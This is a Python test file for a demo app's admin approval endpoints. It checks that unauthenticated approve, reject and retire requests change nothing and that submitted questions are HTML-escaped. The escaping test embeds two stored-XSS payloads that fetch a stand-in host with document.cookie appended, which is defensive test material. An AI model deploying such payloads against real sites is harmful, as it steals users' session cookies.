"""Approval is the human-in-the-loop control, so its auth is tested first.

WHY this file exists separately from test_admin_demo_view.py: these handlers
WRITE. An unauthenticated POST that mints nothing is a nuisance; an
unauthenticated POST that publishes a stranger's text onto the public demo is
the failure this whole feature is shaped to prevent.
"""
from __future__ import annotations

from rulesagent.api import main as api_main
from rulesagent.demo_db import (
    approve_example, list_examples, log_event, mark_warmed, pool_for_frontend,
)


def test_unauthenticated_approve_publishes_nothing(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    response = api_main.admin_approve_example(
        question="Can I respond to a land being played?",
        event_id="1",
        authorization=None,
        admin_session=None,
    )
    assert response.status_code == 401
    assert list_examples(db) == []


def test_unauthenticated_reject_records_nothing(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    response = api_main.admin_reject_candidate(
        question="anything", authorization=None, admin_session=None)
    assert response.status_code == 401
    # _connect (demo_db.py:72) does db_path.parent.mkdir(...) then
    # sqlite3.connect(db_path) -- ANY database touch at all creates the
    # file. Asserting the db never got created is stronger than checking
    # its contents: it also catches a handler that calls
    # reject_candidate(DEMO_DB, question) and only THEN returns the 401
    # login page, which the status-code-only assertion would miss.
    assert not db.exists()


def test_unauthenticated_retire_publishes_nothing(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    approve_example(db, "Can I respond to a land being played?")
    response = api_main.admin_retire_example(
        example_id="1", authorization=None, admin_session=None)
    assert response.status_code == 401
    # The example approved above (before the auth-bypassing call under test)
    # must still be live and unretired -- an unauthenticated POST must not
    # be able to pull a real example off the public demo.
    rows = list_examples(db)
    assert len(rows) == 1
    assert rows[0]["retired_at"] is None


def test_authenticated_retire_removes_it_from_the_pool(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    monkeypatch.setattr(api_main, "_admin_authed", lambda *a, **k: True)
    example_id = approve_example(db, "Can I respond to a land being played?")
    mark_warmed(db, example_id)
    assert pool_for_frontend(db) == ["Can I respond to a land being played?"]

    response = api_main.admin_retire_example(
        example_id=str(example_id), authorization="Bearer x", admin_session=None)
    assert response.status_code == 200

    rows = list_examples(db, include_retired=True)
    assert len(rows) == 1
    assert rows[0]["retired_at"] is not None
    assert pool_for_frontend(db) == []


def test_authenticated_approve_stores_the_edited_text(tmp_path, monkeypatch):
    """The form is a textarea, not a hidden field: Jon can fix a typo or strip
    something personal before the string is ever public. What gets stored is
    what he submitted, not what the visitor typed."""
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    monkeypatch.setattr(api_main, "_admin_authed", lambda *a, **k: True)
    api_main.admin_approve_example(
        question="Can I respond to a land being played?",
        event_id="7",
        authorization="Bearer x",
        admin_session=None,
    )
    rows = list_examples(db)
    assert len(rows) == 1
    assert rows[0]["question"] == "Can I respond to a land being played?"
    assert rows[0]["source_event_id"] == 7


def test_approved_but_unwarmed_is_not_public(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    monkeypatch.setattr(api_main, "_admin_authed", lambda *a, **k: True)
    api_main.admin_approve_example(
        question="Can I respond to a land being played?", event_id="1",
        authorization="Bearer x", admin_session=None)
    assert pool_for_frontend(db) == []


def test_empty_question_is_rejected_with_a_message(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    monkeypatch.setattr(api_main, "_admin_authed", lambda *a, **k: True)
    response = api_main.admin_approve_example(
        question="   ", event_id="1", authorization="Bearer x", admin_session=None)
    assert response.status_code == 400
    assert list_examples(db) == []


def test_candidate_and_pool_questions_are_escaped(tmp_path, monkeypatch):
    """The brief names stored XSS in an authenticated admin panel as the
    threat this page has to resist: every question rendered here was typed
    by a stranger into a public box. Cover both render sites -- the
    candidate row (main.py, inside the textarea/hidden `question` value)
    and the approved-pool row (main.py, the plain question cell) -- so a
    later markup change (swapping the textarea for a div, adding a title
    attribute, moving the question into a data attribute) that drops the
    escape fails this test instead of shipping quietly."""
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    # Two distinct payloads so approving one doesn't remove it from the
    # candidate list (candidate_questions excludes anything already
    # approved) -- each render site gets its own, undisturbed example.
    candidate_payload = "<img src=x onerror=fetch('//evil-candidate/'+document.cookie)>"
    candidate_escaped = (
        "&lt;img src=x onerror=fetch(&#x27;//evil-candidate/&#x27;+document.cookie)&gt;")
    pool_payload = "<img src=x onerror=fetch('//evil-pool/'+document.cookie)>"
    pool_escaped = (
        "&lt;img src=x onerror=fetch(&#x27;//evil-pool/&#x27;+document.cookie)&gt;")

    # Candidate row: a query event with the payload as its question, never
    # approved or rejected, so it's still an open candidate.
    log_event(db, code_id=None, kind="query", ip_hash=None,
              question=candidate_payload, answered=True)
    # Pool row: a different payload, approved.
    approve_example(db, pool_payload)

    html = api_main._admin_page_html()
    assert candidate_payload not in html
    assert candidate_escaped in html
    assert pool_payload not in html
    assert pool_escaped in html


def test_admin_page_shows_candidates_and_the_pool(tmp_path, monkeypatch):
    db = tmp_path / "demo.db"
    monkeypatch.setattr(api_main, "DEMO_DB", db)
    approve_example(db, "How does cascade interact with the stack?")
    html = api_main._admin_page_html()
    assert "How does cascade interact with the stack?" in html
    assert "not warmed yet" in html, (
        "the pool section must say which approved examples are still invisible")
